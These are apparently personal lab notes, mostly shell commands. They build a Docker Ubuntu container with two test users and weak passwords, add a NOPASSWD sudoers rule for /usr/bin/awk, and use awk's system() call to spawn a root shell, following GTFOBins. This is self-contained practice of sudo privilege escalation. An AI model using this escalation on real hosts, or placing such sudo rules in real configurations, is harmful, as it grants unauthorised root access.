### sudoers
```bash
docker pull ubuntu:latest
docker run -dit --name ubuntuServer ubuntu
docker exec -it ubuntuServer bash

# into server
apt update

cd home
useradd -d /home/s4vitar -s /bin/bash -m s4vitar

grep "s4vitar" /etc/passwd

useradd -d /home/manolito -s /bin/bash -m manolito

passwd s4vitar # s4vitar123
passwd manolito # manolito123

su s4vitar
sudo -l
# Sorry, user s4vitar may not run sudo on fa712d0a044e.

# like root
nano /etc/sudoers

# User privilege specification
root    ALL=(ALL:ALL) ALL
s4vitar ALL=(root) NOPASSWD: /usr/bin/awk

su s4vitar
sudo -l

# ans
Matching Defaults entries for s4vitar on fa712d0a044e:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User s4vitar may run the following commands on fa712d0a044e:
    (root) NOPASSWD: /usr/bin/awk

sudo awk
sudo whoami

# https://gtfobins.github.io/gtfobins/awk/
sudo awk 'BEGIN {system("/bin/sh")}'

sudo -u manolito




```